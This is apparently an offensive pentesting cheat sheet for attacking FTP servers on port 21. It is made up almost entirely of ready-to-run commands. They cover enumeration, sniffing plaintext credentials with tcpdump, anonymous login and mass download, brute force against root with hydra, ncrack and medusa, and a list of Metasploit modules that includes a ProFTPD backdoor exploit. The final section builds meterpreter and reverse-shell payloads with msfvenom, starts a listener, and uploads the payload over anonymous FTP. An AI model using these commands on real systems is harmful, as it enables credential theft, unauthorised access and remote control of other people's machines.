# 21 - FTP
## NMAP FTP Enumeration

    $ nmap -p 21 [TARGET_IP] 

## Banner Grabbing 

    $ telnet [TARGET_IP] 21 
    $ nc -vn [TARGET_IP] 21 

## NMAP Unauth Enum 
Checks if an FTP server allows anonymous logins.

    $ sudo nmap -sV -p21 -sC -A [TARGET_IP]

## TCPDump FTP Traffic 

    $ tcpdump -vvAs0 port ftp or ftp-data

Capture credentials in plain text through unencrypted traffic (HTTP, FTP, TELNET)

    $ tcpdump -A -i eth0 'port http or port ftp or port telnet' | grep -i 'user\|pass\|login'

## FTP Connection 
Access the host utilizing FTP

    $ ftp [TARGET_IP]
    $ ftp@[TARGET_IP] 
    $ ccftp [TARGET_IP]

## FTP Access: Anonymous 
FTP login attempt on host with the user anonymous.

    $ ftp [TARGET_IP]username:anonymous

## Available Metasploit Options

    auxiliary/scanner/ftp/anonymous
    auxiliary/scanner/ftp/ftp_version
    auxiliary/scanner/ftp/ftp_login
    exploit/unix/ftp/proftpd_133c_backdoor

## Browser Connection 

    ftp://anonymous:anonymous@[TARGET_IP] 

## Download all files from FTP 

    $ wget -m ftp://anonymous:anonymous@[TARGET_IP]
    $ wget -m --no-passive ftp://anonymous:anonymous@[TARGET_IP]

## Connect to FTP using starttls 

    $ lftp
    $ lftp :~> set ftp:ssl-force true
    $ lftp :~> set ssl:verify-certificate no
    $ lftp :~> connect [TARGET_IP] 
    $ lftp [TARGET_IP]:~> login                        

Usage: login <user|URL> [<pass>]

    $ lftp [TARGET_IP]:~> login username Password 

### If username/password is found:

    1. Connect client to FTP Server through WinSCP
    2. Protocol to: FTP
    3. Encryption To: No Encryption
    4. Host name: IP of the FTP Server
    5. Port: 21
    6. Username and Password: anonymous: anonymous
    7. Click on login
 
## FTP Brute Force 

    $ hydra -l root -P passwords.txt [-t 32] [TARGET_IP] ftp
    $ ncrack -p 21 --user root -P passwords.txt [TARGET_IP] [-T 5]
    $ medusa -u root -P 500-worst-passwords.txt -h [TARGET_IP] -M ftp

## Metasploit - Upload File through FTP (Windows)
    1. > Use exploit/multi/handler 
        Options 
        Set payload windows/meterpreter/reverse_tcp
        Set lhost
        Run
        
    2. Open separate terminal and create custom payloads:
        $ msfvenom -P windows/meterpreter/reverse_tcp LHOST=<IPAddress> LPORT=4444 -f aspx -o <filename.aspx>
        $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
        $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf 
        
    3. $ FTP [TARGET_IP] 21
        > Username= anonymous, password = none
        > Put <filename.aspx>
